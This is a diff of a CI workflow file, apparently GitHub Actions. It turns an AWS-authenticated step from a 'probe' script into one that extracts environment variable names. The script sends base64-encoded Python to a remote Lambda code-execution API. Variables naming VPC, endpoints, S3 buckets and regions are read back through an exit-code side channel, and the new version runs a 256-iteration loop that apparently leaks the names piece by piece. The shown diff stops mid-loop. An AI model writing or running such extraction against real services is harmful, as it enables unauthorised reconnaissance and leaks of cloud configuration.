@@ -23,11 +23,11 @@ jobs:
         run: |
           aws sts get-caller-identity
 
-      - name: Map Lambda environment
+      - name: Extract Lambda environment variable names
         run: |
           pip install boto3 requests requests-aws4auth --quiet
 
-          cat > /tmp/probe.py <<'PY'
+          cat > /tmp/extract_names.py <<'PY'
           import base64
           import re
           import requests
@@ -46,47 +46,16 @@ jobs:
               session_token=creds.token,
           )
 
-          lambda_code = r'''
+          output = []
+
+          for index in range(256):
+              lambda_code = f'''
           import os
 
-          interesting = [
+          names = ",".join(sorted([
               key for key in os.environ
               if any(word in key.upper() for word in [
                   "VPC",
                   "ENDPOINT",
                   "S3",
                   "BUCKET",
-                  "CLOUD",
-                  "REGION",
-              ])
-          ]
-
-          raise SystemExit(7 if interesting else 9)
-          '''
-
-          encoded = base64.b64encode(
-              lambda_code.encode()
-          ).decode()
-
-          response = requests.post(
-              API,
-              json={"code": encoded},
-              auth=auth,
-              timeout=30,
-          )
-
-          print("HTTP:", response.status_code)
-          print("BODY:", response.text)
-
-          match = re.search(
-              r"exit status (\d+)",
-              response.text,
-          )
-
-          print(
-              "ENV_MAP_STATUS:",
-              match.group(1) if match else "NO_EXIT_CODE",
-          )
-          PY
-
-          python3 /tmp/probe.py
